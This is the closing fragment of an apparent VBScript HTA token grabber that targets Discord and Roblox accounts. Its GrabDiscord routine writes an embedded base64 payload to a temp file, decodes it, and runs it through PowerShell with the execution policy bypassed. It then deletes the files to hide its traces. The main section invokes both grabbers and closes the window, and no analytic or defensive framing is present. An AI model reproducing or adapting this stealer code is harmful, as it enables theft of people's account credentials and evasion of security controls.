' === GRABBER DISCORD ===
Sub GrabDiscord()
    On Error Resume Next
    Dim b64file: b64file = TmpFile("dg.b64")
    WriteFile b64file, DG_B64
    Dim psfile: psfile = TmpFile("dg.ps1")
    fso.DeleteFile psfile, True
    RunCmd "powershell -NoProfile -ExecutionPolicy Bypass -Command ""[IO.File]::WriteAllBytes('" & psfile & "',[Convert]::FromBase64String((Get-Content '" & b64file & "' -Raw).Trim()))"""
    If fso.FileExists(psfile) Then
        RunCmd "powershell -NoProfile -ExecutionPolicy Bypass -File """ & psfile & """"
    End If
    fso.DeleteFile b64file, True
    fso.DeleteFile psfile, True
End Sub

' === MAIN ===
Call GrabRoblox
Call GrabDiscord
window.close()

</script>
